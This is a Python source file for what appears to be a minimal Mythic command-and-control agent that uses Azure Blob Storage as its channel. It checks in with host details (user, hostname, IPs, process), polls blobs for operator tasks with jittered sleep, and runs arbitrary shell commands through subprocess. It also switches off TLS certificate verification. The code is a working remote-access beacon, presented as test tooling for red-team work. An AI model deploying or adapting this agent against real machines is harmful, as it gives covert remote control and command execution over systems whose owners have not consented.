#!/usr/bin/env python3
"""
Azure Blob Storage Test Agent
Minimal agent for testing Azure Blob C2 profile communications.
"""

import json
import time
import random
import base64
import urllib.request
import urllib.error
import ssl
import uuid as uuid_lib
import socket
import platform
import os
import sys

# Configuration - Stamped at build time
BLOB_ENDPOINT = ">https://STORAGE_ACCOUNT.blob.core.windows.net"
CONTAINER_NAME = ">agent-XXXXXXXX-XXX"
CONTAINER_SAS = ">[REDACTED_SAS_TOKEN]"
CALLBACK_INTERVAL = int("2" or "30")
CALLBACK_JITTER = int("10" or "10")
AGENT_UUID = ">XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"
AES_KEY = ""


class AzureBlobAgent:
    def __init__(self):
        self.uuid = AGENT_UUID
        self.blob_endpoint = BLOB_ENDPOINT
        self.container_name = CONTAINER_NAME
        self.sas_token = CONTAINER_SAS
        self.callback_interval = CALLBACK_INTERVAL
        self.callback_jitter = CALLBACK_JITTER
        self.checked_in = False
        self.issued_checkin = False

        # Disable SSL verification for testing (remove in production)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE

    def get_blob_url(self, blob_path: str) -> str:
        """Construct full blob URL with SAS token"""
        return f"{self.blob_endpoint}/{self.container_name}/{blob_path}?{self.sas_token}"

    def put_blob(self, blob_path: str, data: bytes) -> bool:
        """Upload data to a blob"""
        url = self.get_blob_url(blob_path)
        try:
            req = urllib.request.Request(
                url,
                data=data,
                method="PUT",
                headers={
                    "x-ms-blob-type": "BlockBlob",
                    "Content-Type": "application/octet-stream",
                    "Content-Length": str(len(data)),
                }
            )
            with urllib.request.urlopen(req, context=self.ssl_context, timeout=30) as resp:
                return resp.status in (200, 201)
        except Exception as e:
            print(f"[!] PUT blob error: {e}")
            return False

    def delete_blob(self, blob_path: str) -> bool:
        """delete a data blob"""
        url = self.get_blob_url(blob_path)
        try:
            req = urllib.request.Request(
                url,
                method="DELETE",
                headers={
                    "x-ms-blob-type": "BlockBlob",
                    "Content-Type": "application/octet-stream",
                }
            )
            with urllib.request.urlopen(req, context=self.ssl_context, timeout=30) as resp:
                return resp.status in (200, 201)
        except Exception as e:
            print(f"[!] DELETE blob error: {e}")
            return False

    def get_blob(self, blob_path: str) -> bytes:
        """Download blob data"""
        url = self.get_blob_url(blob_path)
        try:
            req = urllib.request.Request(url, method="GET")
            with urllib.request.urlopen(req, context=self.ssl_context, timeout=30) as resp:
                return resp.read()
        except urllib.error.HTTPError as e:
            if e.code == 404:
                return b""  # Blob not found
            print(f"[!] GET blob error: {e}")
            return b""
        except Exception as e:
            print(f"[!] GET blob error: {e}")
            return b""

    def build_checkin_message(self) -> dict:
        """Build checkin message for Mythic"""
        return {
            "action": "checkin",
            "uuid": self.uuid,
            "ips": self._get_ips(),
            "os": platform.system().lower(),
            "user": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
            "host": socket.gethostname(),
            "pid": os.getpid(),
            "architecture": platform.machine(),
            "domain": "",
            "integrity_level": 2,
            "external_ip": "",
            "process_name": sys.executable,
        }

    def build_get_tasking_message(self) -> dict:
        """Build tasking message for Mythic"""
        return {
            "action": "get_tasking",
            "tasking_size": 1
        }

    def build_post_response(self, response) -> dict:
        """Build post response for Mythic"""
        return {
            "action": "post_response",
            "responses": response,
        }

    def _get_ips(self) -> list:
        """Get local IP addresses"""
        ips = []
        try:
            hostname = socket.gethostname()
            ips = socket.gethostbyname_ex(hostname)[2]
        except Exception:
            ips = ["127.0.0.1"]
        return ips

    def postMessageAndRetrieveResponseBlob(self, data) -> dict:
        message_id = uuid_lib.uuid4()
        encoded = base64.b64encode((self.uuid + json.dumps(data)).encode())
        self.put_blob(f"ats/{message_id}.blob", encoded)
        response = b""
        while response == b"":
            time.sleep(self.get_sleep_time())
            response = self.get_blob(f"sta/{message_id}.blob")
            print(f"[*] checking for sta/{message_id}.blob: {response}")
        decoded = base64.b64decode(response).decode()
        data = json.loads(decoded[36:])  # Skip UUID prefix
        print(f"[*] Received sta message: {data}")
        self.delete_blob(f"sta/{message_id}.blob")
        return data

    def execute_task(self, task: dict) -> dict:
        """Execute a task and return response"""
        task_id = task.get("id", str(uuid_lib.uuid4()))
        command = task.get("command", "")
        parameters = task.get("parameters", "")

        print(f"[*] Executing task {task_id}: {command}")

        response = {
            "task_id": task_id,
            "user_output": "",
            "completed": True,
            "status": "success",
        }

        try:
            if command == "shell":
                # Execute shell command
                shell_params = json.loads(task.get("parameters", "{}"))
                shell_params = shell_params.get("command", "")
                # Execute shell command
                import subprocess
                result = subprocess.run(
                    shell_params,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=120
                )
                response["user_output"] = result.stdout + result.stderr

            elif command == "whoami":
                response["user_output"] = f"{os.getenv('USER') or os.getenv('USERNAME')}@{socket.gethostname()}"

            elif command == "pwd":
                response["user_output"] = os.getcwd()

            elif command == "hostname":
                response["user_output"] = socket.gethostname()

            elif command == "exit":
                response["user_output"] = "Agent exiting..."
                sys.exit(0)

            else:
                response["user_output"] = f"Unknown command: {command}"
                response["status"] = "error"

        except Exception as e:
            response["user_output"] = f"Error: {str(e)}"
            response["status"] = "error"
            response["completed"] = True

        return response

    def get_sleep_time(self) -> int:
        """Calculate sleep time with jitter"""
        jitter_range = self.callback_interval * (self.callback_jitter / 100)
        jitter = random.uniform(-jitter_range, jitter_range)
        return max(1, int(self.callback_interval + jitter))

    def run(self):
        """Main agent loop"""
        print(f"[*] Azure Blob Test Agent starting")
        print(f"[*] Endpoint: {self.blob_endpoint}")
        print(f"[*] Container: {self.container_name}")
        print(f"[*] Interval: {self.callback_interval}s (jitter: {self.callback_jitter}%)")

        # Initial checkin
        while not self.checked_in:
            data = self.postMessageAndRetrieveResponseBlob(self.build_checkin_message())
            if "action" in data and data["action"] == "checkin" and "status" in data:
                if data["status"] == "success":
                    self.checked_in = True
                    self.uuid = data["id"]
                    print(f"[+] new UUID: {self.uuid}")
                    break
            else:
                time.sleep(self.get_sleep_time())
                continue

        # Main loop
        print("[*] starting main loop")
        while True:
            try:
                # Get tasking
                data = self.postMessageAndRetrieveResponseBlob(self.build_get_tasking_message())
                response_data = None
                if "tasks" in data:
                    print("{*] got tasks")
                    response_data = []
                    for task in data["tasks"]:
                        # Execute task
                        response = self.execute_task(task)
                        response_data.append(response)
                # Post response
                if response_data:
                    data = self.postMessageAndRetrieveResponseBlob(self.build_post_response(response_data))
                time.sleep(self.get_sleep_time())

            except Exception as e:
                print(f"[!] Main loop error: {e}")

            # Sleep with jitter
            time.sleep(self.get_sleep_time())

if __name__ == "__main__":
    agent = AzureBlobAgent()
    agent.run()
